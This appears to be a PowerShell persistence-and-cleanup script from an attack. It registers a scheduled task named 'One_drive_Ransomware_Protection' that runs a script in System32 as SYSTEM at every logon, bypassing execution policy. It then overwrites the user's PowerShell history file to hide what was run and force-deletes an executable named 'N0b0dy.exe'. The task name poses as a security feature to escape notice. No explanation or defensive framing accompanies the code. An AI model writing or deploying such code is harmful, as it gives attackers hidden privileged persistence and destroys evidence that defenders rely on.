# variables for scheduled task
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -noninteractive -File "C:\Windows\System32\exit.ps1"'
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
# register scheduled task
Register-ScheduledTask -TaskName "One_drive_Ransomware_Protection" -Action $action -Trigger $trigger -Principal $principal
# overweite powershell history
Set-Content -Path "C:\Users\$Env:UserName\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Value "Thats not gonna work"
# remove exe
Remove-Item -Path "C:\Windows\System32\N0b0dy.exe" -Force
